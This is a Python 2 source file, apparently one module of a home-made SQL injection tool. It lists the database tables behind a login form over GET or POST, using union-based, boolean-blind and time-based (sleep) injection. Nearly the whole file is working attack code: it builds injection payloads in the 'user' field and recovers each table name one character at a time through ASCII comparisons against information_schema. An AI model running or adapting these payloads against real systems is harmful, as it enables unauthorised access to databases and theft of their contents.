#!/usr/bin/env python
# -*- coding:utf-8 -*-
from config import UnpackFunction
from lib.log import logger
from database import SqliDatabases
from tqdm import trange
from tqdm import tqdm

__author__ = "LoRexxar"


# 获取表名
class SqliTables(SqliDatabases):
    def __init__(self):
        SqliDatabases.__init__(self)

    def get_tables(self):

        # 若databases_name未设置，就跑一下
        if len(self.databases_name) == 0:
            logger.info("Set the parameters of the self.databases_name...")
            SqliDatabases.get_database(self)

        # 每个databases_name需要跑一次tables_name
        for database_name in self.databases_name:
            # 开始跑database_name
            logger.info("Start sqli databases %s's tables_name" % database_name)
            tables_name = []

            if self.sqlirequest == "GET":
                logger.info("The sqlirequest is %s, start sqli tables..." % self.sqlirequest)

                if self.sqlimethod == "normal":

                    logger.info("The sqlimethod is %s..." % self.sqlimethod)
                    logger.info("Start table amount sqli...")
                    # 先注tables的数量
                    payload = "user=ddog123' union SELECT 1,COUNT(*) from information_schema.tables WHERE table_schema = '" + database_name + "' limit 0,1%23&passwd=ddog123&submit=Log+In"
                    r = self.Data.GetData(payload)
                    tables_number = int(UnpackFunction(r))
                    logger.info("Table account sqli success...The tables_number is %d..." % tables_number)
                    print "[*] tables_number: %d" % tables_number

                    # 每个循环跑一次tables的数据
                    for i in trange(int(tables_number), desc="Table sqli...", leave=False):
                        # 首先是tablename的长度
                        logger.info("Start %dth table length sqli..." % (i + 1))
                        payload = "user=ddog123' union SELECT 1,length(table_name) from information_schema.tables WHERE table_schema = '" + database_name + "' limit " + repr(i) + ",1%23&passwd=ddog123&submit=Log+In"
                        r = self.Data.GetData(payload)
                        table_name_len = int(UnpackFunction(r))
                        logger.info("%dth Table name length sqli success...The table_name_len is %d..." % ((i + 1), table_name_len))
                        tqdm.write("[*] %dth table_name_len: %d" % ((i + 1), table_name_len))

                        # 然后注tablename
                        logger.info("Start %dth table name sqli..." % (i + 1))
                        payload = "user=ddog123' union SELECT 1,table_name from information_schema.tables WHERE table_schema = '" + database_name + "' limit " + repr(i) + ",1%23&passwd=ddog123&submit=Log+In"
                        r = self.Data.GetData(payload)
                        table_name = UnpackFunction(r)
                        logger.info("%dth Table name sqli success...The table_name is %s..." % ((i + 1), table_name))

                        # 把table_name插入列表
                        tables_name.append(table_name)
                        tqdm.write("[*] %dth table_name: %s" % ((i + 1), table_name))

                elif self.sqlimethod == "build":

                    logger.info("The sqlimethod is %s..." % self.sqlimethod)
                    logger.info("Start table amount sqli...")

                    for i in trange(100, desc='Table amount sqli', leave=False):
                        # 先注tables的数量
                        payload = "user=user1' %26%26 (SElECT ((SELECT COUNT(table_name) from information_schema.tables WHERE table_schema = '" + database_name + "' limit 0,1) > " + repr(i) + "))%23&passwd=ddog123&submit=Log+In"
                        if self.Data.GetBuildData(payload, self.len) == 0:
                            tables_number = i
                            break

                    logger.info("Tables amount sqli success...The tables_number is %d..." % tables_number)
                    tqdm.write("[*] tables_number: %d" % tables_number)

                    for i in range(0, int(tables_number)):
                        # 然后注tables_name 的 length
                        logger.info("Start %dth table length sqli..." % (i + 1))
                        for j in trange(30, desc="%dth Table length sqli..." % (i + 1), leave=False):
                            payload = "user=user1' %26%26 (select ((SELECT length(table_name) from information_schema.tables WHERE table_schema = '" + database_name + "' limit " + repr(i) + ",1) > " + repr(j) + "))%23&passwd=ddog123&submit=Log+In"
                            if self.Data.GetBuildData(payload, self.len) == 0:
                                table_name_len = j
                                break

                        logger.info("%dth Table name length sqli success...The table_name_len is %d..." % ((i + 1), table_name_len))
                        tqdm.write("[*] %dth table_name_len: %d" % ((i + 1), table_name_len))

                        # 然后注tables名字
                        # 清空table_name
                        table_name = ""
                        logger.info("Start %dth table sqli..." % (i + 1))
                        for j in trange(int(table_name_len), desc='%dth Table sqli' % (i + 1), leave=False):
                            for k in trange(100, desc='%dth Table\'s %dth char sqli' % ((i + 1), (j + 1)),
                                            leave=False):
                                payload = "user=user1' %26%26 (select ((SELECT ascii(substring(table_name," + repr(
                                    j + 1) + ",1)) from information_schema.tables WHERE table_schema = '" + database_name + "' limit " + repr(
                                    i) + ",1) >" + repr(k + 30) + "))%23&passwd=ddog123&submit=Log+In"
                                if self.Data.GetBuildData(payload, self.len) == 0:
                                    table_name += chr(int(k + 30))
                                    break

                        logger.info("%dth Table name sqli success...The table_name is %s..." % ((i + 1), table_name))

                        # 把table_name插入列表
                        tables_name.append(table_name)
                        tqdm.write("[*] %dth table_name: %s" % ((i + 1), table_name))

                elif self.sqlimethod == "time":

                    logger.info("The sqlimethod is %s..." % self.sqlimethod)
                    logger.info("Start table amount sqli...")

                    for i in trange(100, desc='Table amount sqli', leave=False):
                        # 先注tables的数量
                        payload = "user=ddog' union SELECT 1,if((SELECT COUNT(table_name) from information_schema.tables WHERE table_schema = '" + database_name + "' limit 0,1) > " + repr(i) + ",sleep(" + repr(self.time) + "),0)%23&passwd=ddog123&submit=Log+In"
                        if self.Data.GetTimeData(payload, self.time) == 0:
                            tables_number = i
                            break

                    logger.info("Tables amount sqli success...The tables_number is %d..." % tables_number)
                    tqdm.write("[*] tables_number: %d" % tables_number)

                    for i in range(0, int(tables_number)):
                        # 然后注tables_number 的length
                        logger.info("Start %dth table length sqli..." % (i + 1))
                        for j in trange(30, desc="%dth Table length sqli..." % (i + 1), leave=False):
                            payload = "user=ddog' union SELECT 1,if((SELECT length(table_name) from information_schema.tables WHERE table_schema = '" + database_name + "' limit " + repr(i) + ",1) > " + repr(j) + ",sleep(" + repr(self.time) + "),0)%23&passwd=ddog123&submit=Log+In"

                            if self.Data.GetTimeData(payload, self.time) == 0:
                                table_name_len = j
                                break

                        logger.info("%dth Table name length sqli success...The table_name_len is %d..." % ((i + 1), table_name_len))
                        tqdm.write("[*] %dth table_name_len: %d" % ((i + 1), table_name_len))

                        # 然后注tables名字
                        # 清空table_name
                        table_name = ""
                        logger.info("Start %dth table sqli..." % (i + 1))
                        for j in trange(int(table_name_len), desc='%dth Table sqli' % (i + 1), leave=False):
                            for k in trange(100, desc='%dth Table\'s %dth char sqli' % ((i + 1), (j + 1)),
                                            leave=False):
                                payload = "user=ddog' union SELECT 1,if((SELECT  ascii(substring(table_name," + repr(j + 1) + ",1)) from information_schema.tables WHERE table_schema = '" + database_name + "' limit " + repr(i) + ",1) > " + repr(k + 30) + ",sleep(" + repr(self.time) + "),0)%23&passwd=ddog123&submit=Log+In"

                                if self.Data.GetTimeData(payload, self.time) == 0:
                                    table_name += chr(int(k + 30))
                                    break

                        logger.info("%dth Table name sqli success...The table_name is %s..." % ((i + 1), table_name))

                        # 把tables_name插入列表
                        tables_name.append(table_name)
                        tqdm.write("[*] %dth table_name: %s" % ((i + 1), table_name))

            # 然后是post
            elif self.sqlirequest == "POST":
                logger.info("The sqlirequest is %s, start sqli tables..." % self.sqlirequest)

                if self.sqlimethod == "normal":

                    logger.info("The sqlimethod is %s..." % self.sqlimethod)
                    logger.info("Start table amount sqli...")

                    # 先注tables的数量
                    payload = {"user": "ddog' union SELECT 1,COUNT(*) from information_schema.tables WHERE table_schema = '" + database_name + "' limit 0,1#", "passwd": "ddog123"}
                    r = self.Data.PostData(payload)
                    tables_number = int(UnpackFunction(r))
                    logger.info("Table account sqli success...The tables_number is %d..." % tables_number)
                    print "[*] tables_number: %d" % tables_number

                    # 每个循环跑一次tables的数据
                    for i in trange(int(tables_number), desc="Table sqli...", leave=False):
                        # 首先是tablename的长度
                        logger.info("Start %dth table length sqli..." % (i + 1))
                        payload = {"user": "ddog' union SELECT 1,length(table_name) from information_schema.tables WHERE table_schema = '" + database_name + "' limit " + repr(
                            i) + ",1#", "passwd": "ddog123"}
                        r = self.Data.PostData(payload)
                        table_name_len = int(UnpackFunction(r))
                        logger.info("%dth Table name length sqli success...The table_name_len is %d..." % ((i + 1), table_name_len))
                        tqdm.write("[*] %dth table_name_len: %d" % ((i + 1), table_name_len))

                        # 然后注tablename
                        logger.info("Start %dth table name sqli..." % (i + 1))
                        payload = {"user": "ddog' union SELECT 1,table_name from information_schema.tables WHERE table_schema = '" + database_name + "' limit " + repr(
                            i) + ",1#", "passwd": "ddog123"}
                        r = self.Data.PostData(payload)
                        table_name = UnpackFunction(r)
                        logger.info("%dth Table name sqli success...The table_name is %s..." % ((i + 1), table_name))

                        # 把tables_name插入列表
                        tables_name.append(table_name)
                        tqdm.write("[*] %dth table_name: %s" % ((i + 1), table_name))

                elif self.sqlimethod == "build":

                    logger.info("The sqlimethod is %s..." % self.sqlimethod)
                    logger.info("Start table amount sqli...")

                    for i in trange(100, desc='Table amount sqli', leave=False):
                        # 先注tables的数量
                        payload = {"user": "user1' && (SElECT ((SELECT COUNT(table_name) from information_schema.tables WHERE table_schema = '" + database_name + "' limit 0,1) > " + repr(
                            i) + "))#", "passwd": "ddog123"}
                        if self.Data.PostBuildData(payload, self.len) == 0:
                            tables_number = i
                            break

                    logger.info("Tables amount sqli success...The tables_number is %d..." % tables_number)
                    tqdm.write("[*] tables_number: %d" % tables_number)

                    for i in range(0, int(tables_number)):
                        # 然后注table_name 的 length
                        logger.info("Start %dth table length sqli..." % (i + 1))
                        for j in trange(30, desc="%dth Table length sqli..." % (i + 1), leave=False):
                            payload = {"user": "user1' && (select ((SELECT length(table_name) from information_schema.tables WHERE table_schema = '" + database_name + "' limit " + repr(
                                i) + ",1) > " + repr(j) + "))#", "passwd": "ddog123"}
                            if self.Data.PostBuildData(payload, self.len) == 0:
                                table_name_len = j
                                break

                        logger.info("%dth Table name length sqli success...The table_name_len is %d..." % ((i + 1), table_name_len))
                        tqdm.write("[*] %dth table_name_len: %d" % ((i + 1), table_name_len))

                        # 然后注tables名字
                        # 清空table_name
                        table_name = ""
                        logger.info("Start %dth table sqli..." % (i + 1))
                        for j in trange(int(table_name_len), desc='%dth Table sqli' % (i + 1), leave=False):
                            for k in trange(100, desc='%dth Table\'s %dth char sqli' % ((i + 1), (j + 1)),
                                            leave=False):
                                payload = {"user": "user1' && (select ((SELECT ascii(substring(table_name," + repr(
                                    j + 1) + ",1)) from information_schema.tables WHERE table_schema = '" + database_name + "' limit " + repr(
                                    i) + ",1) >" + repr(k + 30) + "))#", "passwd": "ddog123"}
                                if self.Data.PostBuildData(payload, self.len) == 0:
                                    table_name += chr(int(k + 30))
                                    break

                            logger.info("%dth Table name sqli success...The table_name is %s..." % ((i + 1), table_name))

                        # 把tables_name插入列表
                        tables_name.append(table_name)
                        tqdm.write("[*] %dth table_name: %s" % ((i + 1), table_name))

                elif self.sqlimethod == "time":

                    logger.info("The sqlimethod is %s..." % self.sqlimethod)
                    logger.info("Start table amount sqli...")

                    for i in trange(100, desc='Table amount sqli', leave=False):

                        # 先注tables的数量
                        payload = {"user": "admi' union SELECT 1,if((SELECT COUNT(table_name) from information_schema.tables WHERE table_schema = '" + database_name + "' limit 0,1) > " + repr(
                            i) + ",sleep(" + repr(self.time) + "),0)#", "passwd": "ddog123"}
                        if self.Data.PostTimeData(payload, self.time) == 0:
                            tables_number = i
                            break

                    logger.info("Tables amount sqli success...The tables_number is %d..." % tables_number)
                    tqdm.write("[*] tables_number: %d" % tables_number)

                    for i in range(0, int(tables_number)):
                        # 然后注tables_number 的length
                        logger.info("Start %dth table length sqli..." % (i + 1))
                        for j in trange(30, desc="%dth Table length sqli..." % (i + 1), leave=False):
                            payload = {"user": "admi' union SELECT 1,if((SELECT length(table_name) from information_schema.tables WHERE table_schema = '" + database_name + "' limit " + repr(
                                i) + ",1) > " + repr(j) + ",sleep(" + repr(self.time) + "),0)#", "passwd": "ddog123"}

                            if self.Data.PostTimeData(payload, self.time) == 0:
                                table_name_len = j
                                break

                        logger.info("%dth Table name length sqli success...The table_name_len is %d..." % ((i + 1), table_name_len))
                        tqdm.write("[*] %dth table_name_len: %d" % ((i + 1), table_name_len))

                        # 然后注tables名字
                        # 清空table_name
                        table_name = ""
                        logger.info("Start %dth table sqli..." % (i + 1))
                        for j in trange(int(table_name_len), desc='%dth Table sqli' % (i + 1), leave=False):
                            for k in trange(100, desc='%dth Table\'s %dth char sqli' % ((i + 1), (j + 1)),
                                            leave=False):
                                payload = {"user": "admi' union SELECT 1,if((SELECT  ascii(substring(table_name," + repr(
                                    j + 1) + ",1)) from information_schema.tables WHERE table_schema = '" + database_name + "' limit " + repr(
                                    i) + ",1) > " + repr(k + 30) + ",sleep(" + repr(self.time) + "),0)#", "passwd": "ddog123"}

                                if self.Data.PostTimeData(payload, self.time) == 0:
                                    table_name += chr(int(k + 30))
                                    break

                        logger.info("%dth Table name sqli success...The table_name is %s..." % ((i + 1), table_name))

                        # 把tables_name插入列表
                        tables_name.append(table_name)
                        tqdm.write("[*] %dth table_name: %s" % ((i + 1), table_name))

            self.tables_name[database_name] = tuple(tables_name)

        print "[*] tables_name list: ", self.tables_name
